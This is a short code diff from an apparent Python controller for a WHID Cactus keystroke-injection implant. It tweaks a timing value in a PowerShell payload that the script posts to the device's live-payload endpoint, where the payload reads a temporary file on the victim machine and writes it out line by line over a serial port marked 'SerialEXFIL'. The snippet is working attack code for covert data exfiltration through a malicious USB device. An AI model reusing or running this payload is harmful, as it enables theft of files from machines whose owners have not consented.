@@ -82,7 +82,7 @@ if not resume:
     print(f"Need to send {chunks} chunks - this will take {int(estimate / 60)} minutes!")
 
     # Run exfiltration
-    to_send = '$i=2000; foreach($line in Get-Content $env:TEMP\\tmp){ Start-Sleep -Milliseconds $i; $WHIDport.WriteLine("SerialEXFIL:$line"); $i=600; } '
+    to_send = '$i=2000; foreach($line in Get-Content $env:TEMP\\tmp){ Start-Sleep -Milliseconds $i; $WHIDport.WriteLine("SerialEXFIL:$line"); $i=800; } '
     to_send += '$WHIDport.Close(); exit;'
     requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: {to_send}', "livepayloadpresent": "1"})
     print("LET THE WHID CACTUS DO IT's JOB - DONT USE IT TILL THE ESTIMATED TIME HAS PASSED!!!")
